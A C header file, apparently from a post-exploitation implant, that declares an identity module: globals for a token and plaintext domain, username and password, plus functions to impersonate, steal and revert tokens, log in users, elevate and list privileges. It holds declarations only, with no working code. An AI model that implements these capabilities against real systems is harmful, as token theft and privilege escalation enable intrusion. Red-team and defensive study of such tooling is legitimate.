#pragma once

extern HANDLE gIdentityToken;
extern BOOL gIdentityIsLoggedIn;

#define IDENTITY_MAX_WCHARS_DOMAIN 256
#define IDENTITY_MAX_WCHARS_USERNAME 256
#define IDENTITY_MAX_WCHARS_PASSWORD 512

extern WCHAR* gIdentityDomain;
extern WCHAR* gIdentityUsername;
extern WCHAR* gIdentityPassword;

void IdentityRevertToken(void);
void IdentityImpersonateToken(void);

void IdentityConditionalRevert(BOOL ignoreToken);
void IdentityConditionalImpersonate(BOOL ignoreToken);

void IdentityLoginUser(char* buffer, int length);
void IdentityGetUid(void);

void IdentityStealToken(char* buffer, int length);

void IdentityElevatePre(char* buffer, int length);
void IdentityElevatePost();

void IdentityGetPrivileges(char* buffer, int length);